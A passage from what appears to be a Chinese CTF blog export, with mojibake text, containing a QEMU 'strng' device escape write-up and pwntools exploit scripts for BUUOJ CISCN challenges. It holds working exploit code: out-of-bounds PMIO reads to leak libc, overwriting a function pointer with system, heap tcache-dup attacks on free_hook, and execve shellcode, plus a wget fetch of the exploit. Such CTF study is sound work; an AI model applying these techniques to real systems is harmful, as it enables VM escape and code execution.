æœç´¢strngï¼ŒæŸ¥çœ‹ç›¸å…³å‡½æ•°ã€‚å…ˆæŸ¥çœ‹è®¾å¤‡åˆå§‹åŒ–å‡½æ•°ï¼šstrng_class_initã€‚(è¿™é‡Œéœ€è¦å°†å˜é‡kçš„ç±»å‹è®¾ç½®ä¸ºPCIDeviceClass*)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg)\n\nå¯ä»¥çœ‹åˆ°åŠ è½½äº†strngè®¾å¤‡ï¼Œç„¶åè®¾å¤‡å·device_idæ˜¯0x11e9ï¼Œvendor_idæ˜¯0x1234ï¼Œå¯¹åº”åœ¨qemuä¸­æŸ¥çœ‹ä¸€ä¸‹åˆšæ‰çŒœæµ‹çš„strngè®¾å¤‡ï¼Œè¾“å…¥ï¼šlspci -v -s 00:03.0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502897.jpeg)\n\nå¯ä»¥çœ‹åˆ°çŒœæµ‹æ²¡é”™ã€‚åŒæ—¶å¯ä»¥çœ‹åˆ°å¯¹åº”çš„mmioåœ°å€ä¸º0xfebf1000ï¼Œå¤§å°256ã€‚pmioçš„åœ°å€ä¸º0xc050ï¼Œå¤§å°8ã€‚\n\nâ–²æœ‰æ—¶å€™è¿™äº›å‘½ä»¤å¯èƒ½ä¸å¥½ä½¿ï¼Œåˆ¤æ–­å®Œè®¾å¤‡å·ä¹‹åï¼Œå¯ä»¥è¾“å…¥ï¼š\n\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/configæ¥æŸ¥çœ‹\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502926.jpeg)\n\n5.ä¹‹åä»readå’Œwriteå‡½æ•°ä¸­æ‰¾æ¼æ´ï¼š\n\nè¿™é‡Œå°†ç¬¬ä¸€ä¸ªå‚æ•°opaqueä¿®æ”¹ä¸‹ç±»å‹ä¸ºï¼šstruct STRNGState*ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªï¼Œæ‰“å¼€readå’Œwriteçš„æ±‡ç¼–ä»£ç ï¼Œå¾ˆæ˜æ˜¾å‘ç°æœ‰STRNGState*ï¼Œç„¶åå†è·³è½¬åˆ°ç»“æ„ä½“ç•Œé¢ä¸­æ‰¾ï¼Œè™½ç„¶ä¸å¤ªå¥½æ‰¾ã€‚æ‰¾åˆ°ä¹‹ååŒå‡»ï¼Œå¯ä»¥æ˜¾ç¤ºå‡ºç»“æ„ä½“çš„æ‰€æœ‰æˆå‘˜ï¼Œå‘ç°å°±æ˜¯éœ€è¦çš„é‚£ä¸ªï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502018.jpeg)\n\n(1)å…ˆçœ‹strng_mmio_readå‡½æ•°ï¼Œè¯»å…¥addrå¹¶æŒ‰äºŒè¿›åˆ¶å°†å…¶å³ç§»ä¸¤ä½ï¼Œç›¸å½“äºé™¤ä»¥4ï¼Œä¹‹åå°†ç»“æœä½œä¸ºregsæ•°ç»„çš„ç´¢å¼•ï¼Œè¿”å›è¯¥regs[add>>2]çš„å€¼ã€‚åŒæ—¶è¿˜éœ€è¦æ³¨æ„çš„æ˜¯addrçš„ä½ä¸¤ä½åªèƒ½ä¸º0ï¼Œå¦åˆ™è¿‡ä¸äº†if ( size == 4 && !(addr & 3) )çš„æ£€æŸ¥ã€‚\n\n(2)å†çœ‹strng_mmio_writeå‡½æ•°ï¼š\n\nå½“sizeç­‰äº4æ—¶ï¼Œå°†addrå³ç§»ä¸¤ä½å¾—åˆ°å¯„å­˜å™¨çš„ç´¢å¼•idxï¼Œå¹¶æä¾›4ä¸ªåŠŸèƒ½ï¼š\n\nâ‘ å½“idxä¸º0æ—¶ï¼Œè°ƒç”¨srandå‡½æ•°ä½†å¹¶ä¸ç»™èµ‹å€¼ç»™å†…å­˜ã€‚å½“iä¸º1æ—¶ï¼Œè°ƒç”¨randå¾—åˆ°éšæœºæ•°å¹¶èµ‹å€¼ç»™regs[1]ã€‚\n\nâ‘¡å½“idxä¸º3æ—¶ï¼Œè°ƒç”¨rand_rå‡½æ•°ï¼Œä½¿ç”¨regs[2]çš„åœ°å€ä½œä¸ºå‚æ•°ï¼Œæœ€åå°†è¿”å›å€¼èµ‹å€¼regs[3]ï¼Œä½†åç»­ä»ç„¶ä¼šå°†valå€¼è¦†ç›–åˆ°regs[3]ä¸­ï¼Œå°±æ˜¯è¿·æƒ‘ç”¨çš„ï¼Œå®é™…åŠŸèƒ½ä¹Ÿå°±æ˜¯å°†ä¼ å…¥çš„valueèµ‹å€¼ç»™regs[3]ã€‚\n\nâ–²ä½†æ˜¯è¿™é‡Œçš„ä¼ regs[2]çš„åœ°å€ä¹Ÿæ˜¯ä¸€ä¸ªå…³é”®ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å°†rand_rå‡½æ•°åŠ«æŒä¸ºsystemå‡½æ•°ï¼Œç„¶ååœ¨regs[2]ä¸­æ”¾å…¥\"cat /root/flag\"å­—ç¬¦ä¸²ï¼Œé‚£ä¸å°±å¯ä»¥è°ƒç”¨system(\"cat /root/flag\")ä»è€Œè¯»å–flagäº†å—ã€‚\n\nå…¶ä½™åˆ™ç›´æ¥å°†ä¼ å…¥çš„valueèµ‹å€¼ç»™regs[idx]ã€‚\n\né‚£ä¹ˆé€šè¿‡æ§åˆ¶addrï¼Œè¿›è€Œæ§åˆ¶idx>=2ï¼Œå°±å¯ä»¥é€æ¬¡å°†4ä¸ªå­—èŠ‚æ•°æ®å†™å…¥åˆ°regs[idx]ä¸Šã€‚\n\nâ–²æŒ‰ç†è¯´å¦‚æœå°†idxè¶…å‡ºregsæ•°ç»„èŒƒå›´ï¼Œ64ä¹‹åï¼Œé‚£ä¹ˆä¸å°±å¯ä»¥ä»»æ„è¶Šç•Œå†™äº†å—ï¼Œä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œå› ä¸ºä¼ å…¥çš„addræ˜¯ä¸èƒ½å¤§äºmmioçš„å¤§å°ï¼Œpciè®¾å¤‡å†…éƒ¨ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œè€Œåˆšå¥½regsçš„å¤§å°ä¸º256ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡mmioè¿›è¡Œè¶Šç•Œè¯»å†™ã€‚\n\n(3)æ¥ç€çœ‹strng_pmio_readå‡½æ•°ï¼šå½“ä¼ å…¥çš„ç«¯å£åœ°å€addrä¸º0æ—¶ï¼Œç›´æ¥è¿”å›opaque->addrï¼Œå¦åˆ™å°†opaque->addrå³ç§»ä¸¤ä½ä½œä¸ºç´¢å¼•idxï¼Œè¿”å›regs[idx]çš„å€¼ã€‚è¿™ä¸ªopaque->addråœ¨strng_pmio_writeä¸­è¢«èµ‹å€¼ã€‚\n\n(4)ç„¶åå†çœ‹strng_pmio_writeå‡½æ•°ï¼š\n\nå½“sizeç­‰äº4æ—¶ï¼Œä»¥ä¼ å…¥çš„ç«¯å£åœ°å€ä¸ºåˆ¤æ–­æä¾›4ä¸ªåŠŸèƒ½ï¼š\n\nâ‘ å½“ä¼ å…¥çš„ç«¯å£åœ°å€addrä¸º0æ—¶ï¼Œç›´æ¥å°†ä¼ å…¥çš„valueèµ‹å€¼ç»™opaque->addrã€‚\n\nâ‘¡å½“ä¼ å…¥çš„ç«¯å£åœ°å€addrä¸ä¸º0æ—¶ï¼Œå°†opaque->addrå³ç§»ä¸¤ä½å¾—åˆ°ç´¢å¼•idxï¼Œåˆ†ä¸ºä¸‰ä¸ªåŠŸèƒ½ï¼š\n\nA.idxä¸º0æ—¶ï¼Œæ‰§è¡Œsrandï¼Œè¿”å›å€¼ä¸å­˜å‚¨ã€‚\n\nB.idxä¸º1æ—¶ï¼Œæ‰§è¡Œrandå¹¶å°†è¿”å›ç»“æœå­˜å‚¨åˆ°regs[1]ä¸­ã€‚\n\nC.idxä¸º3æ—¶ï¼Œè°ƒç”¨rand_rå¹¶å°†regs[2]çš„åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿”å›å€¼å­˜å‚¨åˆ°regs[3]ä¸­ã€‚\nå¦åˆ™ç›´æ¥å°†valueå­˜å‚¨åˆ°regs[idx]ä¸­ã€‚\n\nâ–²è¿™é‡Œå°±å¯ä»¥è°ƒç”¨strng_pmio_writeå‡½æ•°ï¼Œå½¢æˆä»»æ„åœ°å€å†™æ¼æ´ã€‚\n\nA.é€šè¿‡å°†addrè®¾ç½®ä¸º0ï¼Œç„¶åä½¿å¾—ä¼ å…¥çš„valueç›´æ¥èµ‹å€¼ç»™opaque->addrï¼Œä½¿å¾—opaque->addrå½¢æˆçš„ç´¢å¼•idxå¤§äº64ï¼Œå°†reg[idx]è¶Šç•ŒæŒ‡å‘rand_rå‡½æ•°æŒ‡é’ˆã€‚\n\nB.ç„¶åå†æ¬¡è°ƒç”¨strng_pmio_writeå‡½æ•°ï¼Œä¼ å…¥ä¸ä¸º0çš„addrã€‚é€šè¿‡opaque->addrå½¢æˆçš„ç´¢å¼•idxï¼Œä½¿å¾—regs[idx]æŒ‡å‘rand_rå‡½æ•°æŒ‡é’ˆï¼Œå°†valueè¶Šç•Œå†™å…¥rand_rï¼ŒåŠ«æŒrand_rå‡½æ•°ã€‚\n\n6.é‚£ä¹ˆæ€»çš„åˆ©ç”¨è¿‡ç¨‹å°±æ¸…æ¥šäº†ï¼š\n\n(1)é€šè¿‡strng_mmio_writeå‡½æ•°ï¼Œå°†regs[2]èµ‹å€¼ä¸º\"cat /root/flag\"ã€‚\n\n(2)é€šè¿‡strng_pmio_writeå‡½æ•°ï¼Œå°†rand_rå‡½æ•°åŠ«æŒä¸ºsystemå‡½æ•°ã€‚\n\nä¹‹åå†è°ƒç”¨strng_mmio_writeå‡½æ•°ï¼Œä½¿å¾—idxä¸º3ï¼Œç„¶åå°†regs[2]çš„åœ°å€ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨rand_rå‡½æ•°ï¼Œä»è€Œè°ƒç”¨system(\"cat /root/flag\")è·å–flagã€‚\n\n7.ä½†æ˜¯ç°åœ¨è¿˜éœ€è¦systemå‡½æ•°çš„åœ°å€ï¼Œé€šè¿‡ä¸Šé¢åˆ†æï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªè¶Šç•Œè¯»æ¼æ´ï¼š\n\n(1)é€šè¿‡strng_pmio_writeå‡½æ•°è®¾ç½®opaque->addrï¼Œä½¿å¾—opaque->addrå½¢æˆçš„ç´¢å¼•idxå¤§äº64ï¼Œè¿›è€Œä½¿å¾—regs[idx]æŒ‡å‘srandå‡½æ•°ã€‚\n\n(2)é€šè¿‡strng_pmio_readå‡½æ•°ï¼Œå€ŸåŠ©ä¿®æ”¹åçš„opaque->addrï¼Œè¯»å–idxç´¢å¼•regs[idx]æŒ‡å‘çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯srandå‡½æ•°æŒ‡é’ˆä¸­çš„å†…å®¹ï¼Œå¯¹åº”çš„å°±æ˜¯srandå‡½æ•°åœ°å€ã€‚\n\n(è¿™é‡Œå¤§å¤šæ•°çš„expéƒ½æ˜¯é’ˆå¯¹srandomå‡½æ•°æ¥æ³„éœ²libcçš„ï¼Œä½†randæˆ–è€…rand_råº”è¯¥ä¹Ÿéƒ½å¯ä»¥)\n\n8.é‚£ä¹ˆç°åœ¨æ€»çš„åˆ©ç”¨è¿‡ç¨‹å°±æ˜¯æ³„éœ²libcåœ°å€ï¼Œç„¶åæ”¹å†™rand_rå‡½æ•°ä¸ºsystemå‡½æ•°ï¼Œå°†\"cat /root/flag\"å†™å…¥åˆ°regs[2]ï¼Œä¹‹åé€šè¿‡rand_r(regs[2])æ¥è°ƒç”¨system(\"cat /root/flag\")ä»è€Œè·å¾—flagã€‚\n\n9.å¼€å§‹ç¼–å†™pocï¼š\n\n(1)å†™å¥½è®¿é—®pmioå’Œmmioç©ºé—´çš„è°ƒç”¨å‡½æ•°ï¼ŒåŠå‰ç½®å‚æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nunsigned char* mmio_mem;\nuint32_t pmio_base=0xc050;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}//ç”¨æ¥æ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œé€€å‡ºç”¨çš„ï¼Œä¸å†™ä¹Ÿæ²¡å…³ç³»\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\nuint32_t pmio_write(uint32_t addr, uint32_t value)\n{\n    outl(value,addr);\n}\n\n\nuint32_t pmio_read(uint32_t addr)\n{\n    return (uint32_t)inl(addr);\n}\n```\n\n(2)æ‰“å¼€resource0æ–‡ä»¶ï¼Œåˆ©ç”¨mmapå°†mmioç©ºé—´æ˜ å°„å‡ºæ¥ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n// Open and map I/O memory for the strng device\nint mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:03.0/resource0\", O_RDWR | O_SYNC);\nif (mmio_fd == -1)\n    die(\"mmio_fd open failed\");\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\nif (mmio_mem == MAP_FAILED)\n    die(\"mmap mmio_mem failed\");\n\nprintf(\"mmio_mem @ %p\\n\", mmio_mem);\n```\n\n(3)å¯¹mmioç©ºé—´è¿›è¡Œå†™æ“ä½œï¼Œè°ƒç”¨strng_mmio_writeå‡½æ•°ï¼Œå°†\"cat /root/flag\"å†™å…¥åˆ°regs[2]ä¸­ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nmmio_write(8,0x20746163);\nmmio_write(12,0x6f6f722f);\nmmio_write(16,0x6c662f74);\nmmio_write(20,0x6761);\n```\n\nè¿™é‡Œç”±äºéœ€è¦æ»¡è¶³ä¼ å…¥çš„addrå³ç§»ä¸¤ä½åå½¢æˆçš„idxéœ€è¦>=2ï¼Œæ‰€ä»¥ä»8ä¾æ¬¡å¼€å§‹ã€‚\n\n(4)ç¼–å†™pmioç©ºé—´è¶Šç•Œè¯»å’Œè¶Šç•Œå†™çš„å‡½æ•°ï¼š\n\n```\nuint32_t pmio_arbread(uint32_t offset)\n{\n    pmio_write(pmio_base+0,offset);\n    return pmio_read(pmio_base+4);\n}\n\nvoid pmio_abwrite(uint32_t offset, uint32_t value)\n{\n    pmio_write(pmio_base+0,offset);\n    pmio_write(pmio_base+4,value);\n}\n```\n\n(5)åˆ©ç”¨pmioç©ºé—´è¶Šç•Œè¯»å–æ¼æ´ï¼Œæ³„éœ²libcåœ°å€ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nif (iopl(3) !=0 )\n    die(\"I/O permission is not enough\");\n\n// leaking libc address\nuint64_t srandom_addr=pmio_arbread(0x108);\nsrandom_addr=srandom_addr<<32;\nsrandom_addr+=pmio_arbread(0x104);\n//è¿™é‡Œçš„éƒ½æ˜¯ä¸ºäº†è®¾ç½®idxä»è€Œè¯»å–ç”¨çš„\n\nprintf(\"leaking srandom addr: 0x%llx\\n\",srandom_addr);\nuint64_t libc_base= srandom_addr-0x43bb0;\nuint64_t system_addr= libc_base+0x4f440;\nprintf(\"libc base: 0x%llx\\n\",libc_base);\nprintf(\"system addr: 0x%llx\\n\",system_addr);\n//ä¸åŒçš„ä¸»æœºç¯å¢ƒçš„libcç‰ˆæœ¬ä¸åŒï¼Œéœ€è¦ä¿®æ”¹\n```\n\n(6)åˆ©ç”¨è¶Šç•Œå†™ï¼Œå°†rand_rå‡½æ•°æ”¹å†™æˆsystemå‡½æ•°\n\n```\n//æ³¨é‡Šå¤´\n\n// overwrite rand_r pointer to system\npmio_abwrite(0x114,system_addr&0xffffffff);\n\nmmio_write(0xc,0);//è¡¥0\n```\n\næœ€åç¼–è¯‘ï¼šgcc -m32 -O0 -static -o exp exp.cï¼Œç„¶åä¼ åˆ°è™šæ‹Ÿæœºé‡Œé¢ï¼Œå¯ä»¥ç”¨ä¸‹åˆ—ä¸¤ç§æ–¹æ³•ï¼š\n\nâ‘ scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntuï¼Œç”±äºå¼€äº†ç«¯å£ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡scpç«¯å£ä¼ è¾“ã€‚\n\nâ‘¡ä½¿ç”¨pythonåº“ç®€æ˜“æ­å»ºä¸€ä¸ªftpä¼ è¾“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#ä¸»æœºä¸­è¿è¡Œ\npython2 -m SimpleHTTPServer\n\n#qemuä¸­è¿è¡Œï¼Œå…¶ä¸­ipåœ°å€éœ€è¦æ”¹å˜ä¸€ä¸‹ï¼Œå¯¹äºä¸»æœºip\nwget -O ./exp http://192.168.80.132:8000/exp\n```\n\næœ€åå¯ä»¥çœ‹åˆ°æˆåŠŸè¿è¡Œï¼šè¿™é‡Œæˆ‘ä¿®æ”¹äº†cat /root/flagå‘½ä»¤ï¼Œå˜æˆ/bin/shï¼Œå¯ä»¥çœ‹åˆ°è¿”å›äº†ä¸€ä¸ªä¸»æœºé‡Œé¢çš„ç»ˆç«¯shï¼ŒæˆåŠŸå®ç°é€ƒé€¸ã€‚ä½†æ˜¯è¿™ä¸ªç»ˆç«¯shè¾“å…¥å‘½ä»¤ä¸æ˜¾ç¤ºï¼Œå›æ˜¾æ¶ˆæ¯æ¯”è¾ƒæ…¢ï¼Œä½†æ˜¯ä¸ªç¡®ç¡®å®å®çš„ä¸»æœºç»ˆç«¯ï¼Œå¦‚æœæœ‰æ¡ä»¶çš„è¯ï¼Œåº”è¯¥æ˜¯å¯ä»¥å®ç°å¤šé‡é€ƒé€¸çš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502953.jpeg)\n\n \n\nâ–²qemué€ƒé€¸è°ƒè¯•ï¼š\n\n1.å°†expä¼ è¿›qemuä¹‹åï¼Œåœ¨ä¸»æœºä¸Šä½¿ç”¨å‘½ä»¤ps aux|grep qemuï¼Œæ‰¾åˆ°qemuçš„ä»»åŠ¡idï¼Œç„¶ågdb attach qemu_idã€‚\n\n2.ä¸‹æ–­ç‚¹åœ¨éœ€è¦çš„å‡½æ•°ï¼šb *strng_mmio_writeï¼Œç„¶åè¾“å…¥cæ¥ç€è¿è¡Œã€‚\n\n3.åœ¨qemuä¸­sudo ./expï¼Œç°åœ¨å°±èƒ½åœ¨ä¸»æœºçš„gdbä¸­åœä¸‹æ¥ï¼Œå°±å¯ä»¥è°ƒè¯•äº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\np *strng\np strng.regs[1]\np strng.srand\n```\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://xz.aliyun.com/search?keyword=qemu\n\nhttps://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup\n","tags":["qemué¢˜"],"categories":["QEMU","qemu-escape"]},{"title":"CISCN-BUUåˆ·é¢˜è®°å½•2","url":"/2021/08/14/CISCN-BUUåˆ·é¢˜è®°å½•2/","content":"\n1.ciscn_2019_es_1ï¼šUAFï¼Œtcache dupï¼Œæ¯”è¾ƒå¸¸è§„ï¼Œæ³„éœ²åœ°å€ï¼Œæ‰“free_hookã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_es_1\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27956\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size, con, call):\n    sla(menu, \"1\")\n    sla(\"compary's name\\n\", str(size))\n    sa(\"name:\\n\", con)\n    sla(\"compary call:\\n\", str(call))\n\ndef delete(idx):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\n#main_arena_off = 0x3ebc40\n\nadd(0x410,\"A\",123) #0\nadd(0x18,\"B\",123) #1\nadd(0x08,\"/bin/sh\\x00\",123) #2\n\ndelete(0)\nshow(0)\nru(\"name:\\n\")\nmalloc_hook = u64(rc(6).ljust(8,\"\\x00\")) - 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\",malloc_hook)\nlibc_base = malloc_hook - obj.dump(\"__malloc_hook\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nfree_hook = libc_base + obj.dump('__free_hook')\nsystem_addr = libc_base + obj.dump('system')\ndelete(1)\ndelete(1)\nadd(0x18,p64(free_hook),123) #3\nadd(0x18,p64(system_addr),123) #4\nadd(0x18,p64(system_addr),123) #5\ndelete(2)\npause()\np.interactive()\n```\n\n2.ciscn_s_9ï¼šè¿™é¢˜æœ‰ç‚¹æ„æ€ï¼Œæ ˆæº¢å‡ºé•¿åº¦æ¯”è¾ƒçŸ­ï¼Œä½†æ˜¯è¿˜æ˜¯å¤Ÿç”¨æ¥æ³„éœ²åœ°å€ç„¶året2libcã€‚é™¤æ­¤ä¹‹å¤–é¢˜ç›®ä¸­ç»™äº†ä¸€ä¸ªhintï¼Œå¯ä»¥ç›´æ¥å€Ÿç”¨jump espè¿™ä¸ªgadgetæ¥æ‰‹å†™shellcodeï¼Œæ‹‰åŠ¨espä¸Šç§»åˆ°æˆ‘ä»¬è¾“å…¥ä½ç½®ï¼Œè¿™æ ·å°±ä¸å†éœ€è¦è€ƒè™‘åˆ°åŠ«æŒebpä¸ŠæŒªä¹‹åçš„å‡½æ•°å‰©ä¸‹çš„æ±‡ç¼–ä»£ç ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_s_9\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26029\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n#sh has been in ELF\n'''\nsh_addr = 0x080482EA\npayload = \"\"\npayload += \"A\"*(0x48+0x4)\npayload += p32(system_plt)\npayload += p32(0x11111111) #paddding(system_plt ret addr)\npayload += p32(sh_addr)\n'''\n\n\n#sh not in ELF\n'''\npayload = \"\"\npayload += \"A\"*0x10\npayload += p32(read_plt)\npayload += p32(system_plt)\npayload += p32(0x1) #fd\npayload += p32(binsh_addr) #parameter\npayload += p32(0x4) #n\npayload += p32(binsh_addr)\n'''\n\n#leak addr\n'''\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p32(puts_plt)\npayload1 += p32(main_addr)\npayload1 += p32(puts_got)\n\npayload2 = \"\"\npayload2 = \"A\"*0x10\npayload2 += p32(system_plt)\npayload2 += p32(0x11111111) #paddding(system_plt ret addr)\npayload2 += p32(binsh_addr)\n'''\n\njump_esp = 0x08048554\n\nshellcode= '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\nxor eax,eax\nmov al,0xB\nint 0x80\n'''\nshellcode=asm(shellcode)\n\npayload = \"\"\npayload += shellcode\npayload = payload.ljust(0x24,\"A\")\npayload += p32(jump_esp)\npayload += asm(\"sub esp,40;call esp\")\n\nru(\">\\n\")\npause()\nsl(payload)\npause()\np.interactive()\n```\n\n3.ciscn_final_2ï¼šè¿™é¢˜çœŸæ˜¯æœ€æœ‰æ„æ€äº†ï¼Œè°ƒäº†æˆ‘å¿«ä¸€å¤©ã€‚\n\n(1)boolå…¬ç”¨ï¼Œdup freeä¹‹å‰å¿…é¡»å…ˆç”³è¯·ã€‚\n\n(2)int_ptå’Œshort_int_ptå…¨å±€ã€‚\n\n(3)å¼€äº†seccompä¿æŠ¤ï¼Œä½†æ˜¯æœ€å¼€å§‹åŠ è½½äº†flagï¼Œå¥æŸ„fdè®¾ç½®ä¸º666ã€‚\n\nâ–²æ¼æ´åœ¨æ²¡æœ‰æ¸…ç©ºæŒ‡ä»¤ï¼Œå¯ä»¥UAFå’Œtcache dupã€‚å…ˆå¸¸è§„æ€è€ƒä¸€ä¸‹æ€è·¯ï¼ŒUAFå’Œtcache dupæ³„éœ²å †åœ°å€ï¼Œä¹‹åæ„é€ chunkè¿›å…¥unsortedbinä¸­ï¼Œæ³„éœ²libcåœ°å€ï¼Œç„¶ååˆ©ç”¨å †å—ä¸Šæ®‹ç•™çš„libcåœ°å€éƒ¨åˆ†å†™è¦†ç›–_IO_2_2_stdin_ç»“æ„ä½“ä¸­çš„filenoä¸º666ï¼Œè¿™æ ·åœ¨choice>4å°±å¯ä»¥åˆ©ç”¨scanfæ¥ç›´æ¥è¯»å–å¥æŸ„fdä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagï¼Œé¡ºå¸¦æ‰“å°å‡ºæ¥ã€‚\n\nå…¶å®ƒä¸è¯´ï¼Œéœ€è¦æ³¨æ„çš„ä¹Ÿå°±æ˜¯ä¸€ä¸ªprintfçš„æ ¼å¼åŒ–è¾“å‡ºï¼Œæ³„éœ²å †åœ°å€çš„æ—¶å€™ç”¨intæ¥æ”¶ï¼Œç„¶ååˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å°äº0ï¼Œå°äº0åˆ™åŠ ä¸Š0x100000000å³å¯ã€‚\n\nä¸»è¦è¯´libcåœ°å€æ³„éœ²å’Œåˆ©ç”¨ã€‚è¿™é‡Œåˆ©ç”¨éƒ¨åˆ†å †åœ°å€è¿›è¡Œä¸€å®šå †å¸ƒå±€ï¼Œä¿®æ”¹int_chunkçš„sizeä¸º0x4b1ï¼Œè¿™é‡Œæˆ‘å¼„å¤§äº†ï¼Œåªè¦è¶…è¿‡tcacheæœ€å¤§é™åˆ¶å³å¯ã€‚(ç„¶åæˆ‘çœ‹ç½‘ä¸Šå¸¸è§„æ€è·¯éƒ½æ˜¯å¡«æ»¡å¤§äºfastbinçš„tcacheï¼Œä½†æ˜¯æˆ‘å«Œæ¯”è¾ƒéº»çƒ¦ï¼Œå°±ç”¨äº†è‡ªå·±çš„æ–¹æ³•ï¼Œäº‹å®è¯æ˜å¤§ä½¬çš„æ–¹æ³•å…¶å®æ›´æœ‰æ•ˆï¼Œæ¯”è¾ƒä¸å®¹æ˜“å‡ºé”™)ç„¶åå°±æ¯”è¾ƒå‘çˆ¹äº†ã€‚\n\nâ‘ 